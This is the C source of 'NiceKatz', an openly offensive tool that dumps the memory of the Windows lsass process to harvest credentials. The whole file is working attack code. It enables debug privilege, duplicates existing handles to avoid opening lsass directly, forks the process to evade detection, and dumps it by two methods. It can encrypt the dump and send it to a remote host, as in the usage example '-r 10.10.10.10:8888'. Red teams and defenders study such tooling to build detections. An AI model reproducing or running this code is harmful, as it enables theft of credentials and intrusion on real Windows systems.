#include "NiceKatz.h"
#include "MiniDumpWriteDump.h"
#include "SilentProcessExit.h"

int main()
{

    CommandLineArgs CmdArgs = { 0 };

    if (!ParseArgs(&CmdArgs))
    {
        return FALSE;
    }

    if (CmdArgs.TargetgPid == 0)
    {
        if (!FindLsassPid(&CmdArgs.TargetgPid))
        {
            return FALSE;
        }
    }

    if (!GetSeDebugPrivilege())
    {
        return FALSE;
    }

    HANDLE hTarget = NULL;

    if (Duplicate(&hTarget, &CmdArgs.TargetgPid, PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS))
    {
        if (ForkRemoteProcess(hTarget, &hTarget))
        {
            CmdArgs.TargetgPid = GetProcessId(hTarget); // Fork will change the target PID
            goto DumpTarget;
        }
        else
        {
            printf("[!] Failed forking remote process. Trying to dump PID %d witout forking...\n", CmdArgs.TargetgPid);
        }
    }

    if (!Duplicate(&hTarget, &CmdArgs.TargetgPid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ))
    {
        return FALSE;
    }

DumpTarget:
    if (CmdArgs.bMiniDumpWriteDump)
    {
        if (!MiniDump(hTarget, CmdArgs.TargetgPid, &CmdArgs))
        {
            return FALSE;
        }
    }
    else if (CmdArgs.bSilentProcessExit)
    {
        if (!SilentProcessExit(hTarget, CmdArgs.TargetgPid, &CmdArgs))
        {
            return FALSE;
        }
    }
    else
    {
        printf("ERROR: -m option is mandatory!\n");
        return FALSE;
    }
    return TRUE;
}

BOOL ParseArgs(pCommandLineArgs pCmdArgs)
{

    LPWSTR* ArgList;
    uint32_t NumOfArgs;

    ArgList = CommandLineToArgvW(GetCommandLine(), (int*)&NumOfArgs);
    if (ArgList == NULL)
    {
        printf("[-] Failed to retreive command line args\n");
        GetError(L"CommandLineToArgvW");
        return FALSE;
    }

    if (NumOfArgs > 8 || NumOfArgs < 3)
    {
        printf("ERROR: Incorrect number of arguments!\n");
        goto PrintUsage;
    }

    for (int i = 1; i < NumOfArgs; i++)
    {
        if (_wcsicmp(ArgList[i], L"-e") == 0)
        {
            pCmdArgs->bEncryptDump = TRUE;
        }
        else if (_wcsicmp(ArgList[i], L"-r") == 0)
        {
            if (i + 1 < NumOfArgs) {
                i++;
                if (!IsValidFormat(ArgList[i], pCmdArgs))
                {
                    goto PrintUsage;
                }
                pCmdArgs->bSendRemotly = TRUE;
            }
            else
            {
                printf("ERROR: Invalid usage of the -r option!\n");
                goto PrintUsage;
            }
        }
        else if (_wcsicmp(ArgList[i], L"-m") == 0)
        {
            if (i + 1 < NumOfArgs)
            {
                i++;
                if (lstrlenW(ArgList[i]) > 1)
                {
                    printf("ERROR: Invalid length for dump method value!\n");
                    goto PrintUsage;
                }
                switch (*(ArgList[i]))
                {
                case L'1':
                    pCmdArgs->bMiniDumpWriteDump = TRUE;
                    pCmdArgs->bSilentProcessExit = FALSE;
                    break;
                case L'2':
                    pCmdArgs->bSilentProcessExit = TRUE;
                    pCmdArgs->bMiniDumpWriteDump = FALSE;
                    break;
                default:
                    printf("ERROR: Invalid value for dump method!\n");
                    goto PrintUsage;
                }
            }
        }
        else if (_wcsicmp(ArgList[i], L"-p") == 0)
        {
            if (i + 1 < NumOfArgs)
            {
                i++;
                if (!ValidateNumber(ArgList[i]))
                {
                    printf("ERROR: PID can only contain numbers!\n");
                    goto PrintUsage;
                }
                pCmdArgs->TargetgPid = wcstol(ArgList[i], NULL, 10);
            }
            else
            {
                printf("ERROR: -p option has to be followed by a valid PID!\n");
                goto PrintUsage;
            }
        }
        else
        {
            printf("ERROR: %S is an invalid option!\n", ArgList[i]);
            goto PrintUsage;
        }
    }

    LocalFree(ArgList);
    return TRUE;

PrintUsage:
    LocalFree(ArgList);
    Usage();
    return FALSE;
}

BOOL IsValidFormat(WCHAR* RemoteAddress, pCommandLineArgs pCmdArgs)
{

    WCHAR* Port;
    WCHAR* IpAddress = wcstok(RemoteAddress, L":", &Port);
    if (!ValidateIp(IpAddress))
    {
        printf("ERROR: Invalid IP format!\n");
        return FALSE;
    }

    wcsncpy_s(pCmdArgs->ServerInformation.IpAddress, _countof(pCmdArgs->ServerInformation.IpAddress), IpAddress, _TRUNCATE);

    if (!ValidateNumber(Port))
    {
        printf("ERROR: Port can only contain digits!\n");
        return FALSE;
    }

    wcsncpy_s(pCmdArgs->ServerInformation.Port, _countof(pCmdArgs->ServerInformation.Port), Port, _TRUNCATE);

    return TRUE;
}

BOOL ValidateIp(WCHAR* IpAddress)
{

    int TempNumber, NumOfDots = 0;
    WCHAR* PartialIpAddress;
    WCHAR* Token;
    WCHAR* TempIpAddress = StrDupW(IpAddress); // wcstok changes origin, this function only needs to validate
    if (TempIpAddress == NULL)
    {
        return FALSE;
    }

    PartialIpAddress = wcstok(TempIpAddress, L".", &Token);
    if (PartialIpAddress == NULL)
    {
        goto ReturnFalse;
    }

    while (PartialIpAddress) {
        if (!ValidateNumber(PartialIpAddress))
        {
            goto ReturnFalse;
        }
        TempNumber = wcstol(PartialIpAddress, NULL, 10);
        if (TempNumber >= 0 && TempNumber <= 255)
        {
            PartialIpAddress = wcstok(NULL, L".", &Token);
            if (PartialIpAddress != NULL)
            {
                NumOfDots++;
            }
        }
        else
        {
            goto ReturnFalse;
        }
    }
    if (NumOfDots != 3)
    {
        goto ReturnFalse;
    }
    LocalFree(TempIpAddress);
    return TRUE;

ReturnFalse:
    LocalFree(TempIpAddress);
    return FALSE;
}

BOOL ValidateNumber(WCHAR* String)
{
    while (*String)
    {
        if (!isdigit(*String))
        {
            return FALSE;
        }
        String++;
    }
    return TRUE;
}

BOOL Duplicate(HANDLE* hTarget, int* TargetPid, DWORD dwDesiredPermissions)
{

    ULONG HandleInfoLength = 1024;
    PSYSTEM_HANDLE_INFORMATION HandleInfo = NULL;
    NTSTATUS status;

    do {
        HandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(HandleInfo, HandleInfoLength *= 2);

        if (HandleInfo == NULL)
        {
            printf("[-] Failed to realloc!\n");
            return FALSE;
        }

        status = NtQuerySystemInformation(SystemHandleInformation, HandleInfo, HandleInfoLength, NULL);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (status != STATUS_SUCCESS)
    {
        GetError(L"NtQuerySystemInformation");
        return FALSE;
    }

    ULONG HandleNumber = HandleInfo->NumberOfHandles;
    ULONG i;
    USHORT TempPid;
    HANDLE hDuplicated, hProcessTemp;
    ULONG ObjectInformationLength = 1024;
    PPUBLIC_OBJECT_TYPE_INFORMATION ObjectInformation = NULL;
    ULONG ReturnLength;

    for (i = 0; i < HandleNumber; i++)
    {

        TempPid = HandleInfo->Handles[i].UniqueProcessId;
        if (TempPid == *(TargetPid))
        {
            continue; // To avoid direct OpenProcess to the target process
        }

        hProcessTemp = OpenProcess(PROCESS_DUP_HANDLE, FALSE, TempPid);
        if (hProcessTemp == INVALID_HANDLE_VALUE || hProcessTemp == NULL)
        {
            continue;
        }

        if (!DuplicateHandle(hProcessTemp, HandleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hDuplicated, dwDesiredPermissions, FALSE, NULL))
        {
            //printf("[-] Failed to duplicate handle\n"); 
            //GetError(L"DuplicateHandle");
            CloseHandle(hProcessTemp);
            continue;
        }

        ObjectInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(ObjectInformationLength);
        if (ObjectInformation == NULL)
        {
            //printf("[-] Failed to malloc for NtQueryObject!\n");
            CloseHandle(hProcessTemp);
            CloseHandle(hDuplicated);
            continue;
        }
        status = NtQueryObject(hDuplicated, ObjectTypeInformation, ObjectInformation, ObjectInformationLength, &ReturnLength);
        if (status != STATUS_SUCCESS)
        {
            //GetError(L"NtQueryObject");
            CloseHandle(hProcessTemp);
            CloseHandle(hDuplicated);
            free(ObjectInformation);
            continue;
        }

        if (wcscmp(L"Process", ObjectInformation->TypeName.Buffer) != 0)
        {
            CloseHandle(hProcessTemp);
            CloseHandle(hDuplicated);
            free(ObjectInformation);
            continue;
        }
        free(ObjectInformation);

        if (GetProcessId(hDuplicated) != *(TargetPid))
        {
            CloseHandle(hProcessTemp);
            CloseHandle(hDuplicated);
            continue;

        }

        *(hTarget) = hDuplicated;
        printf("[+] Process handle to PID %d with the desired permissions duplicated successfully\n", GetProcessId(*(hTarget)));
        CloseHandle(hProcessTemp);
        free(HandleInfo);
        return TRUE;
    }

    free(HandleInfo);
    printf("[-] No open handles with the desired permissions to PID %d found.\n", *(TargetPid));
    return FALSE;
}

BOOL ForkRemoteProcess(HANDLE hTarget, HANDLE* hTargetForked)
{

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == NULL)
    {
        printf("[-] Could not get a handle to Ntdll\n");
        GetError(L"GetModuleHandle");
        return FALSE;
    }
    NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    if (NtCreateProcessEx == NULL)
    {
        printf("[-] Could not find NtCreateProcessEx in NTDLL");
        GetError(L"GetProcAddress");
        return FALSE;
    }

    NTSTATUS status = NtCreateProcessEx(
        *(&hTargetForked),
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        NULL,
        hTarget,
        0,
        NULL,
        NULL,
        NULL,
        0
    );
    if (status != ERROR_SUCCESS)
    {
        printf("NtCreateProcess failed!\n");
        return FALSE;
    }
    printf("[+] Forked PID %d successfully. Forked process PID: %d\n", GetProcessId(hTarget), GetProcessId(*hTargetForked));

    return TRUE;

}

BOOL FindLsassPid(int* TargetPid)
{
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        GetError(L"CreateTollhelp32Snapshot");
        return FALSE;
    }

    if (!Process32First(hSnapshot, &pe))
    {
        GetError(L"Process32First");
        return FALSE;
    }

    do {
        if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0)
        {
            printf("[+] Found lsass PID: %d\n", pe.th32ProcessID);
            *(TargetPid) = pe.th32ProcessID;
            return TRUE;
        }
    } while (Process32Next(hSnapshot, &pe));

    printf("[-] NiceKatz was unable to retrieve lsass PID..\n");
    GetError(L"Process32Next");
    return FALSE;
}

BOOL GetSeDebugPrivilege() {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Failed to get a handle to ntdll\n");
        GetError(L"GetModuleHandle");
    }

    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    if (RtlAdjustPrivilege == NULL)
    {
        printf("[-] Could not find RtlAdjustPrivilege in NTDLL");
        GetError(L"GetProcAddress");
        return FALSE;
    }

    BOOLEAN Enabled = FALSE;
    NTSTATUS status = RtlAdjustPrivilege(20, TRUE, FALSE, &Enabled);
    if (status != STATUS_SUCCESS)
    {
        printf("RtlAdjustPrivilege failed\n");
        return FALSE;
    }

    return TRUE;
}

void GetError(WCHAR* FunctionName)
{
    DWORD ErrorCode = GetLastError();
    LPTSTR ErrorText = NULL;

    FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        ErrorCode,
        LANG_SYSTEM_DEFAULT,
        &ErrorText,
        0,
        NULL);

    printf("[-] The function %S failed with error code %d - %S", FunctionName, ErrorCode, ErrorText);
    LocalFree(ErrorText);
}

void Usage() {
    printf("\nNiceKatz v0.1\n\tAlon Leviev(@0xDeku)\n\n");
    printf("Mandatory args: \n"
        "-m Process dump method\n"
        "\t1 = Dump target process by using MiniDumpWriteDump\n"
        "\t2 = Dump target process by using SilentProcessExit(Does not support -r and -e ATM)\n");
    printf("\n");
    printf("Other args: \n"
        "-e Encrypt output file\n"
        "-r Send dmp remotly without touching the disk\n"
        "\t<IP_ADDR> The ip address to send the dump to\n"
        "\t<PORT> The port of which to connect to\n"
        "-p Target process id to dump(Default: LSASS pid)\n");
    printf("\n");
    printf("Examples: \n"
        "- Dump lsass by using MiniDumpWriteDump and ecrypt the output file:\n"
        "\tNiceKatz.exe -m 1 -e\n"
        "- Dump PID 1234 by using SilentProcessExit method:\n"
        "\tNiceKatz.exe -m 2 -p 1234\n"
        "- Dump PID 5678 by using MiniDumpWriteDump, encrypt the dump in memory and send remotly:\n"
        "\tNiceKatz.exe -m 1 -p 5678 -r 10.10.10.10:8888 -e\n"
    );
    printf("\n");
}
